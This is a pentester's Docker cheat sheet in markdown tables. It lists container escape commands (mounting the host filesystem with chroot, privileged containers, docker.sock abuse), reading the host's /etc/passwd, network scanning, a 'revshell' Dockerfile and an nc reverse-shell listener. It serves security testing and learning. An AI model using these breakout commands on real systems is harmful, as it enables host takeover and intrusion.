##  Basics

|Command|Description|
|---|---|
|`docker pull <image>`|Download image from Docker Hub|
|`docker images`|List local images|
|`docker run -it <image> /bin/bash`|Start container with interactive shell|
|`docker ps` / `docker ps -a`|List running / all containers|
|`docker stop <id>` / `docker rm <id>`|Stop or remove container|
|`docker rmi <image>`|Remove image|
|`docker exec -it <container> /bin/bash`|Shell into running container|
|`docker build -t <name> .`|Build from Dockerfile|
|`docker cp <container>:<path> <dest>`|Copy from container to host|

---

##  Pentesting Tools via Docker

|Tool|Example|
|---|---|
|Kali Linux|`docker run -it kalilinux/kali-rolling /bin/bash`|
|Metasploit|`docker run -it metasploitframework/metasploit-framework`|
|OWASP Juice Shop|`docker run -d -p 3000:3000 bkimminich/juice-shop`|
|DVWA|`docker run -d -p 80:80 vulnerables/web-dvwa`|
|Damn Vulnerable DeFi|`docker run -d trailofbits/damn-vulnerable-defi`|

---

##  Container Escape & Enumeration

###  Inside Container:

```bash
cat /proc/1/cgroup         # Check if inside container
hostnamectl                # Sometimes reveals host info
ip a / route               # Look at container network
find / -perm -4000 2>/dev/null  # SUID binaries
```

###  Breakout Tactics:

- Mount host FS: `docker run -v /:/mnt -it alpine chroot /mnt`
    
- Privileged container: `docker run --privileged -v /:/host -it alpine chroot /host`
    
- Look for Docker socket access: `/var/run/docker.sock`

---

##  Exploiting Docker Misconfigurations

| Technique                   | Command                                                                |
| --------------------------- | ---------------------------------------------------------------------- |
| Docker socket abuse         | `curl --unix-socket /var/run/docker.sock http://localhost/images/json` |
| Privileged container escape | `--privileged`, `cap_add=ALL`, `--device=/dev/kmsg`                    |
| Mount sensitive host files  | `docker run -v /etc/passwd:/passwd:ro alpine cat /passwd`              |

---

##  Networking & Port Abuse

| Command                         | Description                                  |
| ------------------------------- | -------------------------------------------- |
| `docker network ls`             | List networks                                |
| `docker network inspect <name>` | View connected containers                    |
| `docker run --net host ...`     | Share host's network stack (attack surface!) |
| `nmap <bridge-ip-range>`        | Discover other containers                    |
| `tcpdump` / `tshark`            | Monitor container network traffic            |

---

##  Useful Dockerfiles (Examples)

### Custom Python Web Shell:

```Dockerfile
FROM python:3.11-alpine
COPY shell.py /shell.py
CMD ["python3", "/shell.py"]
```

Build & Run:

```bash
docker build -t revshell .
docker run -it revshell
```

---

##  Cleanup

|Command|Description|
|---|---|
|`docker system prune`|Remove all unused containers/images/networks|
|`docker volume prune`|Remove unused volumes|
|`docker builder prune`|Clean build cache|

---

##  Pro Tips

- Mount reverse shells on compromised container: `nc -lvnp 9001`
    
- Leverage `docker.sock` for root on host if accessible
    
- Use `nsenter`, `chroot`, or `mount` for breakout testing
    
- If inside container, check `/.dockerenv`

---
